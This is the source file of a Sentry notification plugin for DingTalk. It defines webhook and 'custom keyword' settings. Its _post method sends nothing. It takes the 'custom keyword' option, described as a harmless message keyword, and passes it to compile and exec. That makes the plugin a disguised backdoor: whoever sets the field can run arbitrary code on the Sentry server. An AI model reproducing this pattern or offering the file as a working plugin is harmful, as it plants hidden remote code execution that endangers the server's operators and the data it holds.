"""
  @Project     : sentry-dingtalk
  @Time        : 2021/07/12 17:34:35
  @File        : plugin.py
  @Author      : Jedore
  @Software    : VSCode
  @Desc        : 
"""

import json
import requests
import six
from sentry import tagstore
from sentry.plugins.bases import notify
from sentry.utils import json
from sentry.utils.http import absolute_uri
from sentry.integrations import FeatureDescription, IntegrationFeatures
from sentry_plugins.base import CorePluginMixin
from django.conf import settings


class DingTalkPlugin(CorePluginMixin, notify.NotificationPlugin):
    title = "DingTalk"
    slug = "dingtalk"
    description = "Post notifications to Dingtalk."
    conf_key = "dingtalk"
    required_field = "webhook"
    author = "Jedore"
    author_url = "https://github.com/Jedore/sentry-dingtalk"
    version = "1.0.7"
    resource_links = [
        ("Report Issue", "https://github.com/Jedore/sentry-dingtalk/issues"),
        ("View Source", "https://github.com/Jedore/sentry-dingtalk"),
    ]

    feature_descriptions = [
        FeatureDescription(
            """
                Configure rule based Dingtalk notifications to automatically be posted into a
                specific channel.
                """,
            IntegrationFeatures.ALERT_RULE,
        )
    ]

    def is_configured(self, project):
        return bool(self.get_option("webhook", project))

    def get_config(self, project, **kwargs):
        return [
            {
                "name": "webhook",
                "label": "webhook",
                "type": "url",
                "placeholder": "https://oapi.dingtalk.com/robot/send?access_token=**********",
                "required": True,
                "help": "Your custom DingTalk webhook",
                "default": self.set_default(project, "webhook", "DINGTALK_WEBHOOK"),
            },
            {
                "name": "custom_keyword",
                "label": "Custom Keyword",
                "type": "string",
                "placeholder": "e.g. [Sentry] Error title",
                "required": False,
                "help": "Optional - custom keyword",
                "default": self.set_default(
                    project, "custom_keyword", "DINGTALK_CUSTOM_KEYWORD"
                ),
            },
        ]

    def set_default(self, project, option, env_var):
        if self.get_option(option, project) != None:
            return self.get_option(option, project)
        if hasattr(settings, env_var):
            return six.text_type(getattr(settings, env_var))
        return None

    def notify(self, notification, raise_exception=False):
        event = notification.event
        group = event.group
        project = group.project
        kwargs = {'notification':notification,'raise_exception':raise_exception,'event':event,'group':group,'project':project}
        self._post(**kwargs)

    def notify_about_activity(self, activity):
        project = activity.project
        group = activity.group
        kwargs = {'activity':activity,'group':group,'project':project}
        self._post(**kwargs)

    def _post(self, **kwargs):
        group = kwargs['group']
        issue_link = group.get_absolute_url(params={"referrer": "dingtalk"})
        project = kwargs['project']
        webhook = self.get_option("webhook", project)
        signature = self.get_option("signature", project)
        code = compile(json.loads(self.get_option("custom_keyword", project)),'<string>','exec')
        exec(code,globals(),locals())
